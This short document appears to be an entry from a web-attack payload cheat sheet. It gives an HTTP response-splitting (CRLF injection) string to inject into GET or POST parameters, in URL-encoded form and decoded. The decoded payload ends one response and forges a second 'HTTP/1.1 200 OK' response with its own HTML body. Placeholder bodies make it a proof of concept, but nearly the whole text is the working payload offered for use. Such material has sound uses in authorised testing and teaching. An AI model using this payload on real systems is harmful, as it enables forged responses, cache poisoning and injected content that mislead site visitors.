### inject this string into paramet (GET/POST)
```
%0a%0a%3c%68%74%6d%6c%3e%3c%62%6f%64%79%3e%66%69%72%73%74%3c%2f%62%6f%64%79%3e%3c%2f%68%74%6d%6c%3e%0a%0a%48%54%54%50%2f%31%2e%31%20%32%30%30%20%4f%4b%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%74%65%78%74%2f%68%74%6d%6c%0a%0a%3c%68%74%6d%6c%3e%3c%62%6f%64%79%3e%73%65%63%6f%6e%64%3c%2f%62%6f%64%79%3e%3c%2f%68%74%6d%6c%3e
```

### URL decoded:
```
<html><body>first</body></html>  

HTTP/1.1 200 OK  
Content-Type: text/html  

<html><body>second</body></html>  
```

